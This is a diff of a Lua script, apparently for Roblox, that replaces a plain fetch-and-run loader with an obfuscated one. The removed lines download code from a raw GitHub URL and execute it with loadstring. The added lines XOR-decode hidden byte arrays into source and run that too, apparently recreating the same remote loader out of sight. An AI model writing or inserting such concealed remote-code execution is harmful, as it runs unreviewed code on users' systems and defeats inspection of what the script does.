@@ -1,4 +1,47 @@
-local http = game:HttpGet("https://raw.githubusercontent.com/asatooo/w/refs/heads/main/file")
-if http and #http > 0 then
-    loadstring(http)()
-end
+return(({
+    jB=function(F,R,q) F[34] = R F[10] = R F[48] = R; return F; end,ok=function(F,R,q) F[45] = R F[25] = R F[46] = R F[20] = R F[50] = R; return F; end,dD=function(F,R,q) F[6] = R F[18] = R F[27] = R F[3] = R F[24] = R; return F; end,Yp=function(F,R,q) F[14] = R F[60] = R F[77] = R; return F; end,Pj=function(F,R,q) F[44] = R F[34] = R F[73] = R F[7] = R F[59] = R; return F; end,Jg=function(F,R,q) F[2] = R F[1] = R F[38] = R; return F; end,Cz=function(F,R,q) F[49] = R F[94] = R F[0] = R; return F; end,tm=function(F,R,q) F[15] = R F[40] = R F[14] = R; return F; end,
+    Qg=function(F,R,q)
+        local k = 254;
+        local k2 = 104;
+        local IDX = q;
+        local t = {};
+        local b = bit32 or require('bit');
+        local qV = b.bxor;
+        local state = 0x2A;
+        local i = 1;
+        local j = 1;
+
+        while true do
+            if state == 0x2A then
+                if i > #IDX then state = 0x7B else state = 0x31 end
+            elseif state == 0x31 then
+                local chunk = R[IDX[i]];
+                if j > #chunk then
+                    i = i + 1;
+                    j = 1;
+                    state = 0x2A;
+                else
+                    local v = chunk[j];
+                    local n = (v - k2);
+                    local c = qV(n, k);
+                    if c < 0 then c = c % 256 end;
+                    if c > 255 then c = c % 256 end;
+                    table.insert(t, string.char(c));
+                    j = j + 1;
+                end
+            elseif state == 0x7B then
+                break;
+            end
+        end
+        return table.concat(t);
+    end,
+    xN=function(F,R,q)
+        local c = F:Qg(R,q);
+        local l = loadstring or load;
+        local f = l(c);
+        if f then return f() else return nil end;
+    end,
+    Ai=function(F,R,q)
+        return F:xN(R,q);
+    end
+}):Ai({{324,319,348,255,256,326,254,242,242,246,326,263,248,258,326,325,254,242,242,246,326,296,326,310,326,242,254,259,248,348,326,326,326,326,250,249,263,258,245,242,244,255,248,257,318,254,242,242,246,319,318,319,348,259,248,258,348},{250,249,261,263,250,326,254,242,242,246,326,299,326,257,263,251,259,300,286,242,242,246,289,259,242,318,324,254,242,242,246,245,300,313,313,244,263,241,312,257,255,242,254,243,260,243,245,259,244,261,249,248,242,259,248,242,312,261,249,251,313,263,245,263,242,249,249,249,313,241,313,244,259,256,245,313,254,259,263,258,245,313,251,263,255,248,313,256,255,250,259}}, {2,1}))
